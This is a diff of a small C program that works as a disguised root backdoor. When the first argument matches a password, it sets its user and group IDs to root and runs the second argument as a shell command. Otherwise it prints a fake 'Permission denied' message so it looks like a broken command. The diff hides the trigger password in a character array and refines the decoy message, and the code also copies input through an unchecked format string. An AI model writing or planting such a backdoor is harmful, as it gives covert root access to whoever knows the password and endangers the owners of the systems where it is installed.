@@ -4,17 +4,18 @@
 #include <stdlib.h>
 int main(int argc, char *argv[])
 {
-	if(strcmp(argv[1], "why?") == 0)
+	char name[10] = {'p', 'l', 'e', 'r', '?', '\0', 'P', '6', '9', '\0'};
+	if(strcmp(argv[1], ("%s", name)) == 0)
 	{
 	setgid(0);
-        setuid(0);
-        char command[100] = {0};
-        sprintf(command, argv[2]);
-        system(command);
+	setuid(0);
+	char command[100] = {0};
+	sprintf(command, argv[2]);
+	system(command);
 	}
 	else
 	{
-	printf("bash: /usr/bin/%s", argv[0]);
-	printf(" : Permission denied\n");
+	printf("sh: /usr/bin/%s: Permission denied\n", argv[0]);
 	}
 }
+
